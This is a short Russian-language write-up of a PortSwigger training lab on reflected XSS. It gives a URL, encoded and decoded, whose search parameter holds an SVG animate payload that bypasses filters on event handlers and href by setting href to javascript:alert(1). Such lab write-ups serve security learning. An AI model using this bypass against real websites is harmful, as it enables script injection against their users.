# Reflected XSS with event handlers and href attributes blocked

## Writeup

Главная страница:

![](https://github.com/fobblified/Writeups/blob/main/Portswigger/(XSS)_Cross-site_scripting/Reflected_XSS_with_event_handlers_and_href_attributes_blocked/assets/1.png)

Для решения будем использовать следующий эксплоит:
```
https://0ac900fa04b46e4ac08e1ff1002e002d.web-security-academy.net/?search=%3Csvg%3E%3Ca%3E%3Canimate+attributeName%3Dhref+values%3Djavascript%3Aalert(1)+%2F%3E%3Ctext+x%3D20+y%3D20%3EClick%20me%3C%2Ftext%3E%3C%2Fa%3E
```

Код эксплоита без URL кодировки:
```
https://0ac900fa04b46e4ac08e1ff1002e002d.web-security-academy.net/?search=<svg><a><animate attributeName=href values=javascript:alert(1) /><text x=20 y=20>Click me</text></a>
```

Получаем ответ от сервера.

![](https://github.com/fobblified/Writeups/blob/main/Portswigger/(XSS)_Cross-site_scripting/Reflected_XSS_with_event_handlers_and_href_attributes_blocked/assets/2.png)
